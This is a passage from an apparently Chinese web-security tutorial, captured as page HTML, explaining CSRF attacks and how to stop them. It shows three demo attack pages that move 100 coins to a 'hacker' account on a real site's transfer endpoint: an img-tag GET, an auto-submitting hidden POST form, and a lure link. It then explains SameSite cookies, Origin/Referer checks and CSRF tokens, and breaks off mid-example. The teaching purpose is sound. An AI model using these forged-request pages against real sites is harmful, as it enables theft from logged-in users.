width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>自动发起 Get 请求</h3>\n<p>黑客最容易实施的攻击方式是自动发起 Get 请求，具体攻击方式你可以参考下面这段代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="63882886437966225000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<!DOCTYPE html>\n<html>\n  <body>\n    <h1>黑客的站点：CSRF 攻击演示</h1>\n    <img src=&quot;https://time.geekbang.org/sendcoin?user=hacker&number=100&quot; />\n  </body>\n</html>`, `63882886437966225000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>黑客的站点：CSRF 攻击演示<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://time.geekbang.org/sendcoin?user=hacker&amp;number=100<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这是黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内，欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 极客币就被转移到黑客的账户上去了。</p>\n<h3 id="自动发起-post-请求"><a href="#%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7-post-%E8%AF%B7%E6%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>自动发起 POST 请求</h3>\n<p>除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的方式你可以参考下面示例代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="25809082609178870000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<!DOCTYPE html>\n<html>\n  <body>\n    <h1>黑客的站点：CSRF 攻击演示</h1>\n    <form id=&quot;hacker-form&quot; action=&quot;https://time.geekbang.org/sendcoin&quot; method=&quot;POST&quot;>\n      <input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;hacker&quot; />\n      <input type=&quot;hidden&quot; name=&quot;number&quot; value=&quot;100&quot; />\n    </form>\n    <script>\n      document.getElementById(\'hacker-form\').submit();\n    </script>\n  </body>\n</html>`, `25809082609178870000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>黑客的站点：CSRF 攻击演示<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker-form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://time.geekbang.org/sendcoin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n      document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'hacker-form\'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>在这段代码中，我们可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨站点 POST 数据提交。</p>\n<h3 id="引诱用户点击链接"><a href="#%E5%BC%95%E8%AF%B1%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E9%93%BE%E6%8E%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>引诱用户点击链接</h3>\n<p>除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接，示例代码如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="63939583194939260000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<div>\n  <img width=&quot;150&quot; src=&quot;http://jpg&quot; />\n  <a href=&quot;https://time.geekbang.org/sendcoin?user=hacker&number=100&quot; target=&quot;_blank&quot;>\n    点击下载美女图片\n  </a>\n</div>`, `63939583194939260000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>150<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://time.geekbang.org/sendcoin?user=hacker&amp;number=100<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>\n    点击下载美女图片\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这段黑客站点代码，页面上放了一张美女图片，下面放了图片下载地址，而这个下载地址实际上是黑客用来转账的接口，一旦用户点击了这个链接，那么他的极客币就被转到黑客账户上了。</p>\n<p>以上三种就是黑客经常采用的攻击方式。如果当用户登录了极客时间，以上三种 CSRF 攻击方式中的任何一种发生时，那么服务器都会将一定金额的极客币发送到黑客账户。</p>\n<p>到这里，相信你已经知道什么是 CSRF 攻击了。和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击</p>\n<h2 id="如何防止-csrf-攻击"><a href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-csrf-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何防止 CSRF 攻击</h2>\n<p>了解了 CSRF 攻击的一些手段之后，我们再来看看 CSRF 攻击的一些“特征”，然后根据这些“特征”分析下如何防止 CSRF 攻击。下面是我总结的发起 CSRF 攻击的三个必要条件：</p>\n<ol>\n<li>目标站点一定要有 CSRF 漏洞；</li>\n<li>用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；</li>\n<li>需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。</li>\n</ol>\n<p>满足以上三个条件之后，黑客就可以对用户进行 CSRF 攻击了。这里还需要额外注意一点，与 XSS 攻击不同，CSRF 攻击不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击我们主要的防护手段是提升服务器的安全性。</p>\n<p>要让服务器避免遭受到 CSRF 攻击，通常有以下几种途径。</p>\n<h3 id="cookie-的-samesite-属性"><a href="#cookie-%E7%9A%84-samesite-%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Cookie 的 SameSite 属性</h3>\n<p>通过上面的介绍，相信你已经知道了黑客会利用用户的登录状态来发起 CSRF 攻击，而 Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据，因此要阻止 CSRF 攻击，我们首先就要考虑在 Cookie 上来做文章。</p>\n<p>通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有如下区别：</p>\n<ul>\n<li>如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器；</li>\n<li>如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。</li>\n</ul>\n<p>而我们要聊的 Cookie 中的 SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效地降低 CSRF 攻击的风险。</p>\n<p>那 SameSite 是怎么防止 CSRF 攻击的呢？</p>\n<p>在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如下：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-49-35-b5956c1f9071a14423700371bffc2911-ea453.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 8.08383233532934%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAATElEQVQI1z3L0QrAIAiF4d7/QQejmVrTjneryQaHnw/EIsNI+sV6kFfxk3dZexNd03EniCWxTulKrcwIRxhgSOw68G3bZvxefV/gEQ8BNXI05ZXSTwAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 49 35"\n        title=""\n        src="/static/2021-07-15-14-49-35-b5956c1f9071a14423700371bffc2911-fee1c.png"\n        srcset="/static/2021-07-15-14-49-35-b5956c1f9071a14423700371bffc2911-a67b7.png 200w,\n/static/2021-07-15-14-49-35-b5956c1f9071a14423700371bffc2911-0b187.png 400w,\n/static/2021-07-15-14-49-35-b5956c1f9071a14423700371bffc2911-fee1c.png 800w,\n/static/2021-07-15-14-49-35-b5956c1f9071a14423700371bffc2911-b1a91.png 1200w,\n/static/2021-07-15-14-49-35-b5956c1f9071a14423700371bffc2911-ea453.png 1336w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>SameSite 选项通常有 Strict、Lax 和 None 三个值。</p>\n<ul>\n<li>Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。</li>\n<li>Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。</li>\n<li>而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。</li>\n</ul>\n<blockquote>\n<p>对于防范 CSRF 攻击，我们可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax 模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的 CSRF 攻击失效。</p>\n</blockquote>\n<h3 id="验证请求的来源站点"><a href="#%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E7%9A%84%E6%9D%A5%E6%BA%90%E7%AB%99%E7%82%B9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>验证请求的来源站点</h3>\n<p>接着我们再来了解另外一种防止 CSRF 攻击的策略，那就是在服务器端验证请求来源的站点。由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请求。那么该怎么判断请求是否来自第三方站点呢？</p>\n<p>这就需要介绍 HTTP 请求头中的 Referer 和 Origin 属性了。</p>\n<p>Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址。比如我从极客时间的官网打开了 InfoQ 的站点，那么请求头中的 Referer 值是极客时间的 URL，如下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-51-07-53fa27471f25c40140791a0e0bc9d93a-36fa6.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 64.36170212765958%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABnElEQVQoz5WSS0sDMRDH9wt68eJHE1HQk0fBkwcLKioIKlgRq33sI+6z3WyySTbZ7T7qJPVR9VJ/DEPIZJiZ/MeSUiazTJUVIJcoBVZ9UpZfx2q+Qtd1Flw5jhvGUUZIadDJUuaMFVIKITgHJxjjEFr8RCe/DAbD0asfBJRSxlhd190K8Gjp/2LB01SDIU0UAgoyzuFysQYWtOT7fhTFcIBum6Zp27ZumvoTGO/7XH+jZ4YYQm9hGMVxQgiBukIUK0huhgZvvqBYRsFBDd2253mTySSOY4yheb5YG115PB5Dvh+EKcZKKS6Krpk/B3L7sti9Bi+HsaorkECZjxfGm8o62XbGtmu7yPGQi95cP0in0fFttLlHt/bpxg7tPWWCptMZTpLpbJaCQRlo2aqUQqNh6Lo4CivOJMkkJa0g54/pwU1x1FeHdwqRxgj2p+0yp6+9k9HZqXN1jq4vcP8eLH24w08PXfshWGek/sWHzg7yHM9LMSmkWvwHPbNt2yA1qJUkSW60ynO2XExCaZYRuKQ010tqdKN6kxhsxDvlMOIkpAs/mAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 51 07"\n        title=""\n        src="/static/2021-07-15-14-51-07-53fa27471f25c40140791a0e0bc9d93a-fee1c.png"\n        srcset="/static/2021-07-15-14-51-07-53fa27471f25c40140791a0e0bc9d93a-a67b7.png 200w,\n/static/2021-07-15-14-51-07-53fa27471f25c40140791a0e0bc9d93a-0b187.png 400w,\n/static/2021-07-15-14-51-07-53fa27471f25c40140791a0e0bc9d93a-fee1c.png 800w,\n/static/2021-07-15-14-51-07-53fa27471f25c40140791a0e0bc9d93a-b1a91.png 1200w,\n/static/2021-07-15-14-51-07-53fa27471f25c40140791a0e0bc9d93a-36fa6.png 1504w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值，具体可参考 Referrer Policy</p>\n<p>但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了 Origin 属性，在一些重要的场合，比如通过 XMLHttpRequest、Fetch 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性，如下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-4eb3c.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 68.80222841225626%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACRklEQVQoz4VT2W7TQBT1L/MfIMELSIgHHnhBQrQoSKBuIiQthS4hbWhrO15mxp7FsR17vNuxzXUrIVZxdB9G13PuOXOurAQrTpDhEtPjpCpS4flSZlUJKOoyh0NTV3U9NJqm2fyEvu+VgxOyNba3J+zVB3p2E9DzkTF5QY5fhvrx9kw+3PUf7AQzK2nKrNm0/a9QjmbW+NQ+mtPxGbGoFC4ytG8E6eHK09xoQbIbXsdFB1e7/nconDkYmS5BroOyNHZcalo24yKOkzyVdZE2Vd53f8FAppRpS0PTl6qmr9cRY4wQEgRhFEVJmhZlWddN96fonTLjfLk0oAzTTNOMc65rOsaYMe5SmiRp27b9P6AIIVYrPwzDLM8hT0YZTKGMxXHc/w8KKBDiwFP9IBjIjFmWBWQpwfUg27YdLKZtoVo4/FjYnbJn2QhuJ0lSVZXvBxgPw2wEIBgCcFzsuIg4UPDFQti2EecCpgxk04QOKYqibmrhhw7zmBcwz6fC58ILhCMDnq5XcSBkIHyPI+xAvwYy+ISo9du0pZQe1lzjwr4+F+hqE7t5lu4s+63L9s08370u3i5Kwx8M3+WvgAFrgA3rTWTkTJ/jvUd0/Ng7fOZPn9Cv70aTq+2D2Wh6c38vubcln07kJ6PcV6u529yuCvI1rVuy5OoX4/S9u/i4tk5zuqjovBfnvTjpU/wZd/t6s3OVjS7z1xf11KiHtMGwqmqqqkO+fBUYyKEiFH68lnlabmTexPlm+Fkymcl1nkSbMquyqGub79/tAKfsmN5vAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 51 34"\n        title=""\n        src="/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-fee1c.png"\n        srcset="/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-a67b7.png 200w,\n/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-0b187.png 400w,\n/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-fee1c.png 800w,\n/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-b1a91.png 1200w,\n/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-4eb3c.png 1436w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>从上图可以看出，Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。</p>\n<p>因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。</p>\n<h3 id="csrf-token"><a href="#csrf-token" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>CSRF Token</h3>\n<p>除了使用以上两种方式来防止 CSRF 攻击之外，还可以采用 CSRF Token 来验证，这个流程比较好理解，大致分为两步。</p>\n<p>第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。你可以参考下面示例代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="92601784708689350000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<!DOCTYPE html>\n<html>\n  <body>\n    <form action=&quot;https://time.geekbang.org/sendcoin&quot; method=&quot;POST&quot;>\n      <input type=&quot;hidden&quot; name=&quot;csrf-token&quot; value=&quot;gdshtr45q1g&quot; />\n      <input type=&quot;text&quot; name=&quot;user&quot; />\n      <input type=&quot;text&quot; name=&quot;number&quot; />\n      <input type=&quot;submit&quot; />\n    </form>\n  </body>\n</html>`, `92601784708689350000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                html 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://time.geekbang.org/sendcoin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token 